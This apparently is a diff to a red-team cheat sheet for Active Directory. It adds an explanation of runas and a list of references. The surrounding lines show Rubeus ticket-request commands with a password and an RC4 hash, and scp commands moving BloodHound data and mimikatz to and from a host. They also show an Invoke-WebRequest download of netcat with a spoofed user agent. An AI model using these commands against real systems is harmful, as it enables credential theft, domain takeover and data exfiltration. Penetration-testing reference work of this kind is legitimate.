@@ -270,7 +270,8 @@ Rubeus.exe asktgt /user:administrator /password:P@$$w0rd! /domain:contoso /ptt
 Rubeus.exe asktgt /user:administraot /rc4:<rc4-hash> /domain:contoso /ptt
 ```
 
-### runas 
+### runas
+This method will spawn a new process as the user. This wont validate your password, so make sure you enter it right. Slowly but surely :) 
 ```
 runas /user:contoso\administrator /netonly powershell
 ```
@@ -395,3 +396,10 @@ wscript.exe .\realtest.vbs
 | `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file using SCP |
 | `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP |
 | `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |
+
+# References
+* https://www.harmj0y.net/
+* https://www.labofapenetrationtester.com/
+* https://ired.team
+* https://github.com/GhostPack/Rubeus
+* https://github.com/gentilkiwi/mimikatz/wiki
